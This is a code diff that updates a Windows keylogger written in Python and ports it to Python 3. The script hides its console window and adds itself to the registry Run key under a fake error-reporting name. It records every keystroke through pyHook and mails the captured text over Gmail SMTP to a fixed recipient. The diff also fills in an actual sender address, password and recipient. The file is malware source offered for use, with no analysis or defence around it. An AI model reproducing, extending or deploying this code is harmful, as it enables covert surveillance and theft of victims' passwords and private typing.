@@ -1,21 +1,25 @@
-import sys,win32api,pythoncom
-import pyHook,os,time,random,smtplib,string
-import urllib
-from _winreg import *
+import sys,os,string,time,random
+import pythoncom,pyHook
+import win32api,win32gui,win32console
+import urllib.request,smtplib
+from winreg import *
 
 global t,yourgmail,yourgmailpass,sendto,interval,otpravka,start_time
 
+
 #########Settings########
-yourgmail="here your gmail"
-yourgmailpass="here your password"
-sendto="whom send the result"
+yourgmail="vladdmyr89@gmail.com"
+yourgmailpass="Bobr1234567890"
+sendto="vladdmyr98@mail.ru"
 interval=10
 otpravka=60
-t =""
+t =''
 start_time=time.time()
-########################
+#########################
 
-def addStartup():  # this will add the file to the startup registry key
+
+def addStartup():
+    """This will add the file to the startup registry key."""
     fp = os.path.dirname(os.path.realpath('PyLoggy.exe'))
     file_name = sys.argv[0].split('\\')[-1]
     new_file_path = fp + '\\' + file_name
@@ -23,21 +27,25 @@ def addStartup():  # this will add the file to the startup registry key
     key2change = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
     SetValueEx(key2change, 'NI Error Reporting.lnl', 0, REG_SZ,new_file_path)
 
+
 def Hide():
-    import win32console
-    import win32gui
+    """Hiding opened window."""
     win = win32console.GetConsoleWindow()
     win32gui.ShowWindow(win, 0)
 
+
 def Mail_it(data):
+    """Sending pressed keys to the email."""
     data = 'Text:\n' + data
     server = smtplib.SMTP('smtp.gmail.com:587')
     server.starttls()
     server.login(yourgmail, yourgmailpass)
     server.sendmail(yourgmail, sendto, data)
     server.close()
- 
+
+
 def OnKeyboardEvent(event):
+    """Save keys which was pressed down."""
     global t,start_time
     if str(event.Key) == 'Back':
         data = '<-'                  #Backspace
@@ -88,13 +96,15 @@ def OnKeyboardEvent(event):
         t = ''
     return True
 
+
 def Main():
+    """Run keylogger."""
     global t
     try:
-     addStartup()
      Hide()
-     urllib.urlopen("http://google.com")
-     "Internet on"
+     addStartup()
+     urllib.request.urlopen('http://google.com')
+     'Internet on'
      hook = pyHook.HookManager()
      hook.KeyDown = OnKeyboardEvent
      hook.HookKeyboard()
@@ -102,6 +112,7 @@ def Main():
     except IOError:
      time.sleep(interval)
      Main()
-     "Internet off"
+     'Internet off'
+
 
 Main()
